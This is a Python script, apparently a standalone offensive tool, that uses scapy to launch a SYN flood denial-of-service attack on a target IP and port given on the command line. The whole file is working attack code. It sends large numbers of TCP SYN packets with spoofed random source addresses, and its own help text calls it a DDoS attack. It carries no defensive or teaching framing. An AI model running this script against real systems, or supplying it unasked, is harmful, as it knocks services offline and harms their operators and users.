import random
import sys
import argparse
from scapy.all import send, IP, TCP

def syn_flood(target_ip, target_port, packet_count=10000):
    try:
        print(f"[*] Launching SYN Flood on {target_ip}:{target_port}")

        for _ in range(packet_count):
            # Generate random source IP and port
            src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            src_port = random.randint(1024, 65535)

            # Construct SYN packet
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=int(target_port), flags="S", seq=random.randint(1000, 9000))
            packet = ip_layer / tcp_layer

            # Send the packet
            send(packet, verbose=False)

        print("[+] SYN Flood attack completed.")

    except Exception as e:
        print(f"[!] Error: {e}")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Perform SYN Flood DDoS attack")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", required=True, help="Target port")
    parser.add_argument("-n", "--count", type=int, default=10000, help="Number of packets to send")
    args = parser.parse_args()

    return args

if __name__ == "__main__":
    # Parse command-line arguments
    args = parse_arguments()

    # Call the syn_flood function with the parsed arguments
    syn_flood(args.target, args.port, args.count)
